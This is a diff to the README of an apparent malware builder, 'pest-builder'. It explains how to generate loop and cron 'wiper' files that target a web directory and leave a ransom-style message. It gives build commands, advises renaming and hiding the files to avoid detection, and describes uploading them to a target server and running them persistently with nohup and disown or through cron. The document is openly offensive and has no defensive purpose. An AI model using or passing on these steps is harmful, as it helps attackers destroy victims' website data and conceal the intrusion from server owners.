@@ -22,11 +22,18 @@ To build the final product you need the following
 - A custom message (A ransom message maybe)
 - Sleep time in seconds (This will be ignored for cron wiper). This serves as a delay between each run.
 
+Then you get a copy of **pest-builder** either by cloning this repo or just copying and pasting the code.
+
+Make it executable by running
+
+```bash
+chmod +x pest-builder
+```
 
 To build a loop wiper, run:
 
 ```bash
-bash pest-builder loop /home/user/public_html "Hacked" 60
+./pest-builder loop /home/user/public_html "Hacked" 60
 ```
 
 A file named ".loop_wiper" will be created.
@@ -35,7 +42,7 @@ A file named ".loop_wiper" will be created.
 To build a cron wiper, run:
 
 ```bash
-bash pest-builder cron /home/user/public_html "Hacked" 60
+./pest-builder cron /home/user/public_html "Hacked" 60
 ```
 
 A file named ".cron_wiper" will be created.
@@ -46,10 +53,16 @@ It is important you obfuscate these files by changing the file names, making the
 Also note that the cron wiper is discouraged as it raises attention and is quick to spot.
 
 ## Using the generated files
-To run the loop_wiper, upload the file to the target server and run the following command on the target server.
+To run the loop_wiper, upload the file to the target server and make it executable by running  
 
 ```bash
-nohup bash .loop_wiper & disown
+chmod +x .loop_wiper
+```
+
+then run the following command on the target server
+
+```bash
+nohup ./.loop_wiper & disown
 ```
 
 To run the .cron_wiper, **add it the the list of cron jobs**. Using the cpanel or **crontab** command.
